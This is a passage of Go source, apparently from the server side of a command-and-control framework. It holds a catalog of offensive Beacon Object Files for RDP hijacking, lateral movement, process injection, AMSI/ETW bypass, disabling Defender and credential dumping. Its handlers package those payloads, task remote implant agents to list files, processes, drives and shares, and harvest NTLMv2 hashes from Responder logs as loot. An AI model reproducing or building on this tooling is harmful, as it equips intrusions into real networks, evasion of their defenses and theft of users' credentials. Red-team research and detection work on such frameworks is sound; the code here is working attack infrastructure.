			{"RDPHijack-BOF", "RDPHijack-BOF", "https://github.com/netero1010/RDPHijack-BOF", "netero1010: hijack disconnected RDP sessions (tscon technique) BOF", false},
			{"ServiceMove-BOF", "ServiceMove-BOF", "https://github.com/netero1010/ServiceMove-BOF", "netero1010: move laterally by abusing service binary hijacking", false},
			{"SQL-BOF", "SQL-BOF", "https://github.com/Tw1sm/SQL-BOF", "Tw1sm: MSSQL enumeration and linked-server lateral movement BOF", false},
			{"cThreadHijack", "cThreadHijack", "https://github.com/connormcgarr/cThreadHijack", "connormcgarr: remote thread hijack via APC for shellcode execution", false},
			{"No-Consolation", "No-Consolation", "https://github.com/fortra/No-Consolation", "Fortra: in-memory PE runner (alternative to fork-and-run)", false},
			// ── Code Injection ─────────────────────────────────────────────────────────
			{"InlineExecute-Assembly", "InlineExecute-Assembly", "https://github.com/anthemtotheego/InlineExecute-Assembly", "anthemtotheego: run .NET assemblies inline without fork-and-run", false},
			{"inject-assembly", "inject-assembly", "https://github.com/kyleavery/inject-assembly", "kyleavery: inject .NET assembly into a remote process via BOF", false},
			{"ThreadlessInject-BOF", "ThreadlessInject-BOF", "https://github.com/iilegacyyii/ThreadlessInject-BOF", "iilegacyyii: threadless process injection technique BOF", false},
			{"PoolPartyBof", "PoolPartyBof", "https://github.com/0xEr3bus/PoolPartyBof", "0xEr3bus: PoolParty process injection via thread pool (8 variants)", false},
			// ── Evasion & Defense Bypass ───────────────────────────────────────────────
			{"injectAmsiBypass", "injectAmsiBypass (boku7)", "https://github.com/boku7/injectAmsiBypass", "boku7: inject AMSI bypass into remote process via BOF", false},
			{"injectEtwBypass", "injectEtwBypass (boku7)", "https://github.com/boku7/injectEtwBypass", "boku7: inject ETW bypass into remote process via BOF", false},
			{"Detect-Hooks", "Detect-Hooks", "https://github.com/anthemtotheego/Detect-Hooks", "anthemtotheego: detect userland hooks placed by EDR in memory", false},
			{"BOF-patchit", "BOF-patchit", "https://github.com/ScriptIdiot/BOF-patchit", "ScriptIdiot: patch AMSI, ETW, and other AV/EDR detections in-process", false},
			{"KillDefender_BOF", "KillDefender_BOF", "https://github.com/Octoberfest7/KillDefender_BOF", "Octoberfest7: disable Windows Defender via BOF (PPLKiller technique)", false},
			{"CobaltWhispers", "CobaltWhispers", "https://github.com/NVISOsecurity/CobaltWhispers", "NVISOsecurity: SysWhispers3 syscall wrappers for direct syscall BOFs", false},
			// ── Enumeration & Recon ────────────────────────────────────────────────────
			{"EDREnum-BOF", "EDREnum-BOF", "https://github.com/mlcsec/EDRenum-BOF", "mlcsec: enumerate installed EDR products via BOF", false},
			{"proctools", "proctools (mlcsec)", "https://github.com/mlcsec/proctools", "mlcsec: process enumeration, parent spoofing check, token listing BOFs", false},
			{"Quser-BOF", "Quser-BOF", "https://github.com/netero1010/Quser-BOF", "netero1010: query logged-on users on local and remote hosts via BOF", false},
			{"FindObjects-BOF", "FindObjects-BOF", "https://github.com/outflanknl/FindObjects-BOF", "Outflank: find process handles and loaded modules by type/name", false},
			{"CredBandit", "CredBandit", "https://github.com/anthemtotheego/CredBandit", "anthemtotheego: in-memory MiniDump with direct syscalls and BOF", false},
			{"TrustMeBOF", "TrustMeBOF", "https://github.com/KriyosArcane/TrustMeBOF", "KriyosArcane: domain trust enumeration and attack BOFs", false},
			{"bofATT", "bofATT", "https://github.com/technoherder/bofATT", "technoherder: ATT&CK technique coverage BOFs (MITRE-mapped)", false},
			{"LdapSignCheck", "LdapSignCheck", "https://github.com/cube0x0/LdapSignCheck", "cube0x0: check if LDAP signing is required on the domain controller", false},
		}
		for i, e := range catalog {
			if _, err := os.Stat(filepath.Join(bofDir, e.ID)); err == nil {
				catalog[i].Installed = true
			}
		}
		json.NewEncoder(w).Encode(map[string]any{"ok": true, "catalog": catalog})
		return
	}

	// POST ?action=uninstall — remove a BOF repo directory
	if r.Method == "POST" && action == "uninstall" {
		var req struct {
			Dir string `json:"dir"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Dir == "" {
			json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "missing dir"})
			return
		}
		if strings.ContainsAny(req.Dir, "/\\.") {
			json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "invalid dir"})
			return
		}
		target := filepath.Join(getBofDir(), req.Dir)
		if err := os.RemoveAll(target); err != nil {
			json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": err.Error()})
			return
		}
		json.NewEncoder(w).Encode(map[string]any{"ok": true})
		return
	}

	// POST — resolve BOF name, pack args, return base64 payload+args
	if r.Method == "POST" {
		var req struct {
			Name string `json:"name"`
			Args string `json:"args"`
		}
		json.NewDecoder(r.Body).Decode(&req)

		bofPath := resolveBof(req.Name)
		if bofPath == "" {
			w.WriteHeader(http.StatusNotFound)
			json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "BOF not found: " + req.Name})
			return
		}
		coffData, err := os.ReadFile(bofPath)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": err.Error()})
			return
		}
		var argsBuf bytes.Buffer
		for _, spec := range strings.Fields(req.Args) {
			packed, e := packBOFArg(spec)
			if e != nil {
				w.WriteHeader(http.StatusBadRequest)
				json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": e.Error()})
				return
			}
			argsBuf.Write(packed)
		}
		argsB64 := ""
		if argsBuf.Len() > 0 {
			argsB64 = base64.StdEncoding.EncodeToString(argsBuf.Bytes())
		}
		json.NewEncoder(w).Encode(map[string]any{
			"ok":      true,
			"name":    filepath.Base(bofPath),
			"payload": base64.StdEncoding.EncodeToString(coffData),
			"args":    argsB64,
		})
		return
	}

	// GET — return grouped list of available BOFs
	bofDir := getBofDir()
	entries := listBofFiles(bofDir)
	type bofJSON struct {
		Name string `json:"name"`
		Path string `json:"path"`
		Repo string `json:"repo"`
	}
	byRepo := map[string][]bofJSON{}
	for _, e := range entries {
		byRepo[e.repo] = append(byRepo[e.repo], bofJSON{e.name, e.path, e.repo})
	}
	repos := make([]string, 0, len(byRepo))
	for rp := range byRepo {
		repos = append(repos, rp)
	}
	sort.Strings(repos)
	type repoJSON struct {
		Name string    `json:"name"`
		Bofs []bofJSON `json:"bofs"`
	}
	var result []repoJSON
	for _, rp := range repos {
		result = append(result, repoJSON{rp, byRepo[rp]})
	}
	json.NewEncoder(w).Encode(map[string]any{"ok": true, "repos": result, "total": len(entries)})
}

// ── Browse handlers (file browser + process browser) ─────────────────────────

// handleBrowseLS sends an LS_JSON task to the agent and returns the result.
// GET /browse/ls?agent=<id>&path=<path>&timeout=<seconds>
func (p *guiProxy) handleBrowseLS(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	agentID := r.URL.Query().Get("agent")
	path    := r.URL.Query().Get("path")
	if agentID == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "missing agent"})
		return
	}
	if path == "" {
		path = "."
	}
	tSec := 30
	if ts := r.URL.Query().Get("timeout"); ts != "" {
		if v, err := fmt.Sscanf(ts, "%d", &tSec); v == 0 || err != nil {
			tSec = 30
		}
	}

	taskID, err := p.c.QueueTask(agentID, "LS_JSON", path, nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	res, err := p.c.WaitResult(agentID, taskID, time.Duration(tSec)*time.Second)
	if err != nil {
		w.WriteHeader(http.StatusGatewayTimeout)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	if res.Error != "" {
		json.NewEncoder(w).Encode(map[string]string{"error": res.Error})
		return
	}
	// res.Output is already JSON from the agent
	w.Write([]byte(res.Output))
}

// handleBrowsePS sends a PS_JSON task to the agent and returns the result.
// GET /browse/ps?agent=<id>&timeout=<seconds>
func (p *guiProxy) handleBrowsePS(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "missing agent"})
		return
	}
	tSec := 30
	if ts := r.URL.Query().Get("timeout"); ts != "" {
		if v, err := fmt.Sscanf(ts, "%d", &tSec); v == 0 || err != nil {
			tSec = 30
		}
	}

	taskID, err := p.c.QueueTask(agentID, "PS_JSON", "", nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	res, err := p.c.WaitResult(agentID, taskID, time.Duration(tSec)*time.Second)
	if err != nil {
		w.WriteHeader(http.StatusGatewayTimeout)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	if res.Error != "" {
		json.NewEncoder(w).Encode(map[string]string{"error": res.Error})
		return
	}
	// res.Output is already JSON array from the agent
	fmt.Fprintf(w, `{"procs":%s}`, res.Output)
}

// handleBrowseDrives sends a DRIVES task to the agent and returns the drive list.
// GET /browse/drives?agent=<id>&timeout=<seconds>
func (p *guiProxy) handleBrowseDrives(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "missing agent"})
		return
	}
	tSec := 30
	if ts := r.URL.Query().Get("timeout"); ts != "" {
		if v, err := fmt.Sscanf(ts, "%d", &tSec); v == 0 || err != nil {
			tSec = 30
		}
	}
	taskID, err := p.c.QueueTask(agentID, "DRIVES", "", nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	res, err := p.c.WaitResult(agentID, taskID, time.Duration(tSec)*time.Second)
	if err != nil {
		w.WriteHeader(http.StatusGatewayTimeout)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	if res.Error != "" {
		json.NewEncoder(w).Encode(map[string]string{"error": res.Error})
		return
	}
	w.Write([]byte(res.Output))
}

// handleResponderLogs reads NTLMv2 hashes from Responder log files and
// returns them as JSON so the browser can render and import them to Loot.
func (p *guiProxy) handleResponderLogs(w http.ResponseWriter, r *http.Request) {
	type hashEntry struct {
		Username   string `json:"username"`
		Domain     string `json:"domain"`
		IP         string `json:"ip"`
		Hash       string `json:"hash"`
		CapturedAt string `json:"captured_at"`
	}
	w.Header().Set("Content-Type", "application/json")

	logDir := "/usr/share/responder/logs"
	entries, err := os.ReadDir(logDir)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "hashes": []hashEntry{}})
		return
	}

	seen := map[string]bool{}
	var hashes []hashEntry

	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		// Accept all NTLMv2 log files: SMB, MSSQL, LDAP, HTTP, FTP, etc.
		if !strings.HasSuffix(name, ".txt") || !strings.Contains(name, "NTLMv2") {
			continue
		}
		// Extract IP from filename: <PROTO>-NTLMv2-SSP-<IP>.txt
		ip := strings.TrimSuffix(name, ".txt")
		if idx := strings.LastIndex(ip, "-"); idx >= 0 {
			ip = ip[idx+1:]
		}

		fpath := filepath.Join(logDir, name)
		f, err := os.Open(fpath)
		if err != nil {
			continue
		}
		fi, _ := e.Info()
		modTime := ""
		if fi != nil {
			modTime = fi.ModTime().UTC().Format(time.RFC3339)
		}
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			// NTLMv2: User::Domain:Challenge:NTProofStr:Blob
			parts := strings.SplitN(line, ":", 6)
			if len(parts) < 6 {
				continue
			}
			user, domain, challenge, ntproof, blob := parts[0], parts[2], parts[3], parts[4], parts[5]
			key := user + "|" + domain + "|" + challenge
			if seen[key] {
				continue
			}
			seen[key] = true
			hashes = append(hashes, hashEntry{
				Username:   user,
				Domain:     domain,
				IP:         ip,
				Hash:       user + "::" + domain + ":" + challenge + ":" + ntproof + ":" + blob,
				CapturedAt: modTime,
			})
		}
		f.Close()
	}

	if hashes == nil {
		hashes = []hashEntry{}
	}
	json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "hashes": hashes})
}

// handleBrowseShares sends a NET_SHARES task to the agent and returns the share list.
// GET /browse/shares?agent=<id>&host=<hostname>&timeout=<seconds>
func (p *guiProxy) handleBrowseShares(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	agentID := r.URL.Query().Get("agent")
	host    := r.URL.Query().Get("host")
	if agentID == "" || host == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "missing agent or host"})
		return
	}
	tSec := 30
	if ts := r.URL.Query().Get("timeout"); ts != "" {
		if v, err := fmt.Sscanf(ts, "%d", &tSec); v == 0 || err != nil {
			tSec = 30
		}
	}
	taskID, err := p.c.QueueTask(agentID, "NET_SHARES", host, nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	res, err := p.c.WaitResult(agentID, taskID, time.Duration(tSec)*time.Second)
	if err != nil {
		w.WriteHeader(http.StatusGatewayTimeout)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	if res.Error != "" {
		json.NewEncoder(w).Encode(map[string]string{"error": res.Error})
		return
	}
	w.Write([]byte(res.Output))
}
